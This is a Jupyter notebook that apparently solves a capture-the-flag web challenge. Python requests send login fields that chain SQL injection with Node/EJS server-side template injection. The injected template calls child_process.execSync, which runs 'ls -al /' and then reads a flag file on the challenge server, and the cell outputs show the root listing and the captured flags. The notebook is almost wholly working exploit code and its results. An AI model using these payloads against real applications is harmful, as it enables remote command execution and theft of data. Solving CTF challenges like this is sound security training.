{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [],
   "source": [
    "def check(username, password):\n",
    "    res = requests.post(\"http://10.113.184.121:10081/login\", data={\"username\": username, \"password\": password}).text\n",
    "    # res = requests.post(\"http://127.0.0.1:3000/login\", data={\"username\": username, \"password\": password}).text\n",
    "    \n",
    "    print(res)\n",
    "    return res == '<h1>Success!</h1>'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    <html><head><title>Success</title></head><body>\n",
      "    <h1>Success!</h1>\n",
      "    <p>Logged in as total 76\n",
      "drwxr-xr-x    1 root     root          4096 Dec 18 18:54 .\n",
      "drwxr-xr-x    1 root     root          4096 Dec 18 18:54 ..\n",
      "-rwxr-xr-x    1 root     root             0 Dec 18 18:54 .dockerenv\n",
      "drwxr-xr-x    1 root     root          4096 Dec 11 18:36 bin\n",
      "drwxr-xr-x    5 root     root           340 Dec 18 18:54 dev\n",
      "drwxr-xr-x    1 root     root          4096 Dec 18 18:54 etc\n",
      "-rw-r--r--    1 root     root            28 Dec 18 17:15 flag1.txt\n",
      "-rw-r--r--    1 root     root            23 Dec 18 17:15 flag2-1PRmDsTXoo3uPCdq.txt\n",
      "drwxr-xr-x    1 root     root          4096 Dec 18 17:15 home\n",
      "drwxr-xr-x    1 root     root          4096 Dec 11 18:36 lib\n",
      "drwxr-xr-x    5 root     root          4096 Dec  7 09:43 media\n",
      "drwxr-xr-x    2 root     root          4096 Dec  7 09:43 mnt\n",
      "drwxr-xr-x    1 root     root          4096 Dec 11 18:36 opt\n",
      "dr-xr-xr-x  500 root     root             0 Dec 18 18:54 proc\n",
      "drwx------    1 root     root          4096 Dec 11 18:36 root\n",
      "drwxr-xr-x    2 root     root          4096 Dec  7 09:43 run\n",
      "drwxr-xr-x    2 root     root          4096 Dec  7 09:43 sbin\n",
      "drwxr-xr-x    2 root     root          4096 Dec  7 09:43 srv\n",
      "dr-xr-xr-x   13 root     root             0 Dec 18 18:54 sys\n",
      "drwxrwxrwt    1 root     root          4096 Dec 22 17:16 tmp\n",
      "drwxr-xr-x    1 root     root          4096 Dec 18 13:27 usr\n",
      "drwxr-xr-x   12 root     root          4096 Dec  7 09:43 var\n",
      ".password\") AS password FROM db where 1=2 UNION SELECT 'FLAG{sqlite_js0n_inject!on}' FROM db; -- </p>\n",
      "    </body></html>\n",
      "    \n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 79,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# template_injection = \"<%= ().__class__.__base__.__subclasses__()[132].__init__.__globals__['system'] ;%>\"\n",
    "template_injection = \"<%= global.process.mainModule.require('child_process').execSync('ls -al /') %>\"\n",
    "username = template_injection\n",
    "username += '''.password\") AS password FROM db where 1=2 UNION SELECT 'FLAG{sqlite_js0n_inject!on}' FROM db; -- '''\n",
    "password = 'FLAG{sqlite_js0n_inject!on}'\n",
    "\n",
    "# username += '''.password\") AS password FROM db where 1=2 UNION SELECT 'FLAG{flag-1}' FROM db; -- '''\n",
    "# password = 'FLAG{flag-1}'\n",
    "\n",
    "check(username, password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    <html><head><title>Success</title></head><body>\n",
      "    <h1>Success!</h1>\n",
      "    <p>Logged in as FLAG{ezzzzz_sqli2ssti}\n",
      ".password\") AS password FROM db where 1=2 UNION SELECT 'FLAG{sqlite_js0n_inject!on}' FROM db; -- </p>\n",
      "    </body></html>\n",
      "    \n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 80,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "template_injection = \"<%= global.process.mainModule.require('child_process').execSync('cat /flag2-1PRmDsTXoo3uPCdq.txt') %>\"\n",
    "username = template_injection\n",
    "username += '''.password\") AS password FROM db where 1=2 UNION SELECT 'FLAG{sqlite_js0n_inject!on}' FROM db; -- '''\n",
    "password = 'FLAG{sqlite_js0n_inject!on}'\n",
    "\n",
    "\n",
    "check(username, password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
